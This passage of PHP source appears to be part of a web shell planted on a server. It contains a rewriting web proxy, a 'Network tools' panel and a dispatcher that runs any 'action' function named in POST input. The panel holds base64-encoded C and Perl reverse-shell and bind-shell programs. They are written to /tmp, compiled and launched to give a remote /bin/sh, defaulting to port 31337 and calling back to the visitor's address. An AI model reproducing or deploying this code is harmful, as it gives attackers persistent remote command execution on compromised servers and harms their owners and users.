			header("Access-Control-Allow-Headers: {$_SERVER['HTTP_ACCESS_CONTROL_REQUEST_HEADERS']}", true);
		}
		exit(0);
		}
	
	}
	
	$contentType = "";
	if (isset($responseInfo["content_type"])) $contentType = $responseInfo["content_type"];
	
	if (stripos($contentType, "text/html") !== false) {
	
		$detectedEncoding = mb_detect_encoding($responseBody, "UTF-8, ISO-8859-1");
		if ($detectedEncoding) {
		$responseBody = mb_convert_encoding($responseBody, "HTML-ENTITIES", $detectedEncoding);
		}
		$doc = new DomDocument();
		@$doc->loadHTML($responseBody);
		$xpath = new DOMXPath($doc);
	
		//Rewrite forms so that their actions point back to the proxy.
		foreach($xpath->query("//form") as $form) {
		$method = $form->getAttribute("method");
		$action = $form->getAttribute("action");
		$action = empty($action) ? $url : rel2abs($action, $url);
		$form->setAttribute("action", rtrim(PROXY_PREFIX, "?"));
		$actionInput = $doc->createDocumentFragment();
		$actionInput->appendXML('<input type="hidden" name="ProxyFormAction" value="' . htmlspecialchars($action) . '" />');
		$form->appendChild($actionInput);
		}
		foreach ($xpath->query("//meta[@http-equiv]") as $element) {
		if (strcasecmp($element->getAttribute("http-equiv"), "refresh") === 0) {
			$content = $element->getAttribute("content");
			if (!empty($content)) {
			$splitContent = preg_split("/=/", $content);
			if (isset($splitContent[1])) {
				$element->setAttribute("content", $splitContent[0] . "=" . PROXY_PREFIX . rel2abs($splitContent[1], $url));
			}
			}
		}
		}
		foreach($xpath->query("//style") as $style) {
		$style->nodeValue = proxifyCSS($style->nodeValue, $url);
		}
		foreach ($xpath->query("//*[@style]") as $element) {
		$element->setAttribute("style", proxifyCSS($element->getAttribute("style"), $url));
		}
		foreach ($xpath->query("//img[@srcset]") as $element) {
		$element->setAttribute("srcset", proxifySrcset($element->getAttribute("srcset"), $url));
		}
		$proxifyAttributes = array("href", "src");
		foreach($proxifyAttributes as $attrName) {
		foreach($xpath->query("//*[@" . $attrName . "]") as $element) { //For every element with the given attribute...
			$attrContent = $element->getAttribute($attrName);
			if ($attrName == "href" && preg_match("/^(about|javascript|magnet|mailto):|#/i", $attrContent)) continue;
			if ($attrName == "src" && preg_match("/^(data):/i", $attrContent)) continue;
			$attrContent = rel2abs($attrContent, $url);
			$attrContent = PROXY_PREFIX . $attrContent;
			$element->setAttribute($attrName, $attrContent);
		}
		}
		$head = $xpath->query("//head")->item(0);
		$body = $xpath->query("//body")->item(0);
		$prependElem = $head != NULL ? $head : $body;
		if ($prependElem != NULL) {
	
		$scriptElem = $doc->createElement("script",
			'(function() {
	
			if (window.XMLHttpRequest) {
	
				function parseURI(url) {
				var m = String(url).replace(/^\s+|\s+$/g, "").match(/^([^:\/?#]+:)?(\/\/(?:[^:@]*(?::[^:@]*)?@)?(([^:\/?#]*)(?::(\d*))?))?([^?#]*)(\?[^#]*)?(#[\s\S]*)?/);
				// authority = "//" + user + ":" + pass "@" + hostname + ":" port
				return (m ? {
					href : m[0] || "",
					protocol : m[1] || "",
					authority: m[2] || "",
					host : m[3] || "",
					hostname : m[4] || "",
					port : m[5] || "",
					pathname : m[6] || "",
					search : m[7] || "",
					hash : m[8] || ""
				} : null);
				}
	
				function rel2abs(base, href) { // RFC 3986
	
				function removeDotSegments(input) {
					var output = [];
					input.replace(/^(\.\.?(\/|$))+/, "")
					.replace(/\/(\.(\/|$))+/g, "/")
					.replace(/\/\.\.$/, "/../")
					.replace(/\/?[^\/]*/g, function (p) {
						if (p === "/..") {
						output.pop();
						} else {
						output.push(p);
						}
					});
					return output.join("").replace(/^\//, input.charAt(0) === "/" ? "/" : "");
				}
	
				href = parseURI(href || "");
				base = parseURI(base || "");
	
				return !href || !base ? null : (href.protocol || base.protocol) +
				(href.protocol || href.authority ? href.authority : base.authority) +
				removeDotSegments(href.protocol || href.authority || href.pathname.charAt(0) === "/" ? href.pathname : (href.pathname ? ((base.authority && !base.pathname ? "/" : "") + base.pathname.slice(0, base.pathname.lastIndexOf("/") + 1) + href.pathname) : base.pathname)) +
				(href.protocol || href.authority || href.pathname ? href.search : (href.search || base.search)) +
				href.hash;
	
				}
	
				var proxied = window.XMLHttpRequest.prototype.open;
				window.XMLHttpRequest.prototype.open = function() {
					if (arguments[1] !== null && arguments[1] !== undefined) {
					var url = arguments[1];
					url = rel2abs("' . $url . '", url);
					url = "' . PROXY_PREFIX . '" + url;
					arguments[1] = url;
					}
					return proxied.apply(this, [].slice.call(arguments));
				};
	
			}
	
			})();'
		);
		$scriptElem->setAttribute("type", "text/javascript");
	
		$prependElem->insertBefore($scriptElem, $prependElem->firstChild);
	
		}
	
		echo "<!-- Proxified page constructed by Proxy -->\n" . $doc->saveHTML();
	} else if (stripos($contentType, "text/css") !== false) { //This is CSS, so proxify url() references.
		echo proxifyCSS($responseBody, $url);
	} else { //This isn't a web page or CSS, so serve unmodified through the proxy with the correct headers (images, JavaScript, etc.)
		header("Content-Length: " . strlen($responseBody), true);
		echo $responseBody;
	}
}
function actionNetwork() {
	hardHeader();
	$back_connect_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pIHsNCiAgICBpbnQgZmQ7DQogICAgc3RydWN0IHNvY2thZGRyX2luIHNpbjsNCiAgICBkYWVtb24oMSwwKTsNCiAgICBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJdKSk7DQogICAgc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsNCiAgICBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsNCiAgICBpZiAoKGNvbm5lY3QoZmQsIChzdHJ1Y3Qgc29ja2FkZHIgKikgJnNpbiwgc2l6ZW9mKHN0cnVjdCBzb2NrYWRkcikpKTwwKSB7DQogICAgICAgIHBlcnJvcigiQ29ubmVjdCBmYWlsIik7DQogICAgICAgIHJldHVybiAwOw0KICAgIH0NCiAgICBkdXAyKGZkLCAwKTsNCiAgICBkdXAyKGZkLCAxKTsNCiAgICBkdXAyKGZkLCAyKTsNCiAgICBzeXN0ZW0oIi9iaW4vc2ggLWkiKTsNCiAgICBjbG9zZShmZCk7DQp9";
	$back_connect_p="IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
	$bind_port_c="I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3RyaW5nLmg+DQojaW5jbHVkZSA8dW5pc3RkLmg+DQojaW5jbHVkZSA8bmV0ZGIuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCmludCBtYWluKGludCBhcmdjLCBjaGFyICoqYXJndikgew0KICAgIGludCBzLGMsaTsNCiAgICBjaGFyIHBbMzBdOw0KICAgIHN0cnVjdCBzb2NrYWRkcl9pbiByOw0KICAgIGRhZW1vbigxLDApOw0KICAgIHMgPSBzb2NrZXQoQUZfSU5FVCxTT0NLX1NUUkVBTSwwKTsNCiAgICBpZighcykgcmV0dXJuIC0xOw0KICAgIHIuc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogICAgci5zaW5fcG9ydCA9IGh0b25zKGF0b2koYXJndlsxXSkpOw0KICAgIHIuc2luX2FkZHIuc19hZGRyID0gaHRvbmwoSU5BRERSX0FOWSk7DQogICAgYmluZChzLCAoc3RydWN0IHNvY2thZGRyICopJnIsIDB4MTApOw0KICAgIGxpc3RlbihzLCA1KTsNCiAgICB3aGlsZSgxKSB7DQogICAgICAgIGM9YWNjZXB0KHMsMCwwKTsNCiAgICAgICAgZHVwMihjLDApOw0KICAgICAgICBkdXAyKGMsMSk7DQogICAgICAgIGR1cDIoYywyKTsNCiAgICAgICAgd3JpdGUoYywiUGFzc3dvcmQ6Iiw5KTsNCiAgICAgICAgcmVhZChjLHAsc2l6ZW9mKHApKTsNCiAgICAgICAgZm9yKGk9MDtpPHN0cmxlbihwKTtpKyspDQogICAgICAgICAgICBpZiggKHBbaV0gPT0gJ1xuJykgfHwgKHBbaV0gPT0gJ1xyJykgKQ0KICAgICAgICAgICAgICAgIHBbaV0gPSAnXDAnOw0KICAgICAgICBpZiAoc3RyY21wKGFyZ3ZbMl0scCkgPT0gMCkNCiAgICAgICAgICAgIHN5c3RlbSgiL2Jpbi9zaCAtaSIpOw0KICAgICAgICBjbG9zZShjKTsNCiAgICB9DQp9";
	$bind_port_p="IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
	echo "<h1>Network tools</h1><div class=content>
	<form name='nfp' onSubmit='g(null,null,this.using.value,this.port.value,this.pass.value);return false;'>
	<span>Bind port to /bin/sh</span><br/>
	Port: <input type='text' name='port' value='31337'> Password: <input type='text' name='pass'> Using: <label><select name='using'><option value='bpc'>C</option><option value='bpp'>Perl</option></select></label> <input type=submit value='submit'>
	</form>
	<form name='nfp' onSubmit='g(null,null,this.using.value,this.server.value,this.port.value);return false;'>
	<span>Back-connect to</span><br/>
	Server: <input type='text' name='server' value=". $_SERVER['REMOTE_ADDR'] ."> Port: <input type='text' name='port' value='31337'> Using: <label><select name='using'><option value='bcc'>C</option><option value='bcp'>Perl</option></select></label> <input type=submit value='submit'>
	</form><br>";
	if(isset($_POST['p1'])) {
		function cf($f,$t) {
			$w=@fopen($f,"w") or @function_exists('file_put_contents');
			if($w)	{
				@fwrite($w,@base64_decode($t)) or @fputs($w,@base64_decode($t)) or @file_put_contents($f,@base64_decode($t));
				@fclose($w);
			}
		}
		if($_POST['p1'] == 'bpc') {
			cf("/tmp/bp.c",$bind_port_c);
			$apple = ex("gcc -o /tmp/bp /tmp/bp.c");
			@unlink("/tmp/bp.c");
			$apple .= ex("/tmp/bp ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$apple".ex("ps aux | grep bp")."</pre>";
		}
		if($_POST['p1'] == 'bpp') {
			cf("/tmp/bp.pl",$bind_port_p);
			$apple = ex(which("perl")." /tmp/bp.pl ".$_POST['p2']." &");
			echo "<pre class=ml1>$apple".ex("ps aux | grep bp.pl")."</pre>";
		}
		if($_POST['p1'] == 'bcc') {
			cf("/tmp/bc.c",$back_connect_c);
			$apple = ex("gcc -o /tmp/bc /tmp/bc.c");
			@unlink("/tmp/bc.c");
			$apple .= ex("/tmp/bc ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$apple".ex("ps aux | grep bc")."</pre>";
		}
		if($_POST['p1'] == 'bcp') {
			cf("/tmp/bc.pl",$back_connect_p);
			$apple = ex(which("perl")." /tmp/bc.pl ".$_POST['p2']." ".$_POST['p3']." &");
			echo "<pre class=ml1>$apple".ex("ps aux | grep bc.pl")."</pre>";
		}
	}
	echo '</div>';
	hardFooter();
}
if( empty($_POST['a']) )
	if(isset($_action) && function_exists('action' . $_action))
		$_POST['a'] = $_action;
	else
		$_POST['a'] = 'FilesMan';
if( !empty($_POST['a']) && function_exists('action' . $_POST['a']) )
	call_user_func('action' . $_POST['a']);
?>